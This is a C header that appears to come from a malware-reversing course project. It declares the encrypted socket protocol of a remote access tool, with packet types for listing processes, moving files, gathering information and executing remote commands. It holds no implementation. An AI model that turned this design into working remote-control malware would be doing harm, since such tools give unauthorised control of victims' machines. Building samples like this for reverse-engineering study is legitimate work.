#pragma once
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <WinSock2.h>
#include <wincrypt.h>

#include "crypto.h"
#include "MalwareReversingFinalProject.h"

#define SOCK_TYPE SOCK_STREAM
#define PORT 25565

#pragma comment(lib, "ws2_32.lib")

enum PacketType
{
	PublicKey,
	PrivateKey,
	ProcessListRequest,
	ProcessListStart,
	ProcessListEntry,
	ProcessListEnd,
	ClientDownloadFile,
	ClientUploadFile,
	GetInformation,
	ExecuteCommand,
	ErrorPacket,
	CommandResponse
};

struct MainHeader
{
	unsigned long totalSize;
	enum PacketType type;
	unsigned int dynamic;
};

struct Connection
{
	BOOL connected;
	SOCKET sockfd;
	char key[32];
};

struct ConnreqResponse
{
	char key[32];
};

BOOL RecvData(struct Connection* conn, struct MainHeader** output);
BOOL SendData(struct Connection* conn, enum PacketType type, unsigned char* data, unsigned long datasz);

BOOL StartConnectionServer(SOCKET sockfd);
BOOL StartConnectionClient(char* ipaddr); //TODO: DNS Support?